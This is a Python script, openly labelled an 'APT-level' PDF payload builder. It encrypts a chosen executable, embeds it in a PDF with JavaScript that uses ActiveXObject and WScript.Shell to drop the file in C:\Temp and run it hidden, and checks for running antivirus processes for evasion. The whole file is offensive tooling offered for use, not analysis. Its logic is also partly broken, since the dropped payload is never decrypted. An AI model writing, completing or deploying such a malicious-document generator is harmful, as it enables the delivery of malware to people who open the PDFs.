import os
import time
import base64
import random
import string
import subprocess
import psutil
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from io import BytesIO
from PyPDF2 import PdfWriter, PdfReader
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from rich.console import Console
from rich.table import Table
from tkinter import Tk
from tkinter.filedialog import askopenfilename

# Initialize Rich Console
console = Console()

# Utility functions for encryption
def generate_asymmetric_keys():
    """Generate RSA private and public keys."""
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=4096,
        backend=default_backend()
    )
    return private_key, private_key.public_key()

def rsa_encrypt(data, public_key):
    """Encrypt data using RSA public key."""
    return public_key.encrypt(
        data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

def aes_encrypt(data, key):
    """Encrypt data with AES-256-CBC."""
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    return iv + ciphertext

def generate_key():
    """Generate a symmetric AES-256 key."""
    return os.urandom(32)

# Environment Fingerprinting
def environment_fingerprinting():
    """Gather system environment information for evasion."""
    info = {
        "os_version": os.name,
        "architecture": os.uname().machine,
        "user": os.getenv("USER"),
        "antivirus": detect_antivirus(),
    }
    return info

def detect_antivirus():
    """Detect presence of common antivirus software."""
    av_signatures = ["avast", "avg", "bitdefender", "kaspersky", "mcafee", "norton"]
    return any(sig in (p.name().lower() for p in psutil.process_iter()) for sig in av_signatures)

# File and PDF utilities
def random_filename(extension=".exe"):
    """Generate a random filename."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + extension

def embed_payload_in_pdf(output_pdf_path, payload, symmetric_key, existing_pdf_path=None):
    """Create a PDF with an embedded encrypted payload."""
    buffer = BytesIO()
    c = canvas.Canvas(buffer, pagesize=letter)
    c.drawString(100, 750, "Confidential Data - Restricted Access")
    c.save()
    buffer.seek(0)

    if existing_pdf_path:
        with open(existing_pdf_path, "rb") as f:
            reader = PdfReader(f)
            writer = PdfWriter()
            writer.append(reader)
    else:
        writer = PdfWriter()
        writer.add_page(PdfReader(buffer).pages[0])

    js_payload = f"""
        var key = "{base64.urlsafe_b64encode(symmetric_key).decode()}";
        var payload = "{base64.urlsafe_b64encode(payload).decode()}";

        function executePayload() {{
            try {{
                var fso = new ActiveXObject("Scripting.FileSystemObject");
                var tempFile = "C:\\\\Temp\\\\" + "{random_filename()}";
                var file = fso.CreateTextFile(tempFile, true);
                file.WriteLine(payload);
                file.Close();

                var shell = new ActiveXObject("WScript.Shell");
                shell.Run(tempFile, 0);
                console.log("APT payload executed successfully");
            }} catch (e) {{
                console.log("Error executing payload: " + e.message);
            }}
        }}

        executePayload();
    """
    writer.add_js(js_payload)
    with open(output_pdf_path, "wb") as f:
        writer.write(f)
    console.print(f"[green]PDF with payload created at {output_pdf_path}[/green]")

def select_file():
    """Prompt the user to select a binary file."""
    Tk().withdraw()
    file_path = askopenfilename(filetypes=[
        ("Executable files", "*.exe"),
        ("Binary files", "*.bin"),
        ("All files", "*.*")
    ])
    return file_path

def read_binary_file(file_path):
    """Read binary file content."""
    with open(file_path, 'rb') as f:
        return f.read()

# Main execution
def main():
    console.print("Starting APT-level PDF Payload Creation", style="bold magenta")

    # Select binary payload
    file_path = select_file()
    if not file_path:
        console.print("[red]No file selected, exiting.[/red]")
        return

    payload = read_binary_file(file_path)
    symmetric_key = generate_key()
    private_key, public_key = generate_asymmetric_keys()
    encrypted_payload = aes_encrypt(payload, symmetric_key)
    encrypted_symmetric_key = rsa_encrypt(symmetric_key, public_key)

    output_pdf_path = input("Enter output PDF name (with .pdf extension): ") or "advanced_payload.pdf"
    existing_pdf_path = input("Enter existing PDF path (or leave blank for new): ").strip()
    embed_payload_in_pdf(output_pdf_path, encrypted_payload, symmetric_key, existing_pdf_path or None)

    # Display results
    env_info = environment_fingerprinting()
    table = Table(title="APT Payload Information")
    table.add_column("Detail", style="cyan")
    table.add_column("Value", style="magenta")

    table.add_row("Payload File", os.path.basename(file_path))
    table.add_row("Encrypted Payload", base64.urlsafe_b64encode(encrypted_payload).decode())
    table.add_row("Encrypted Symmetric Key", base64.urlsafe_b64encode(encrypted_symmetric_key).decode())
    table.add_row("Target PDF", output_pdf_path)
    table.add_row("Environment Info", str(env_info))

    console.print(table)

if __name__ == "__main__":
    main()

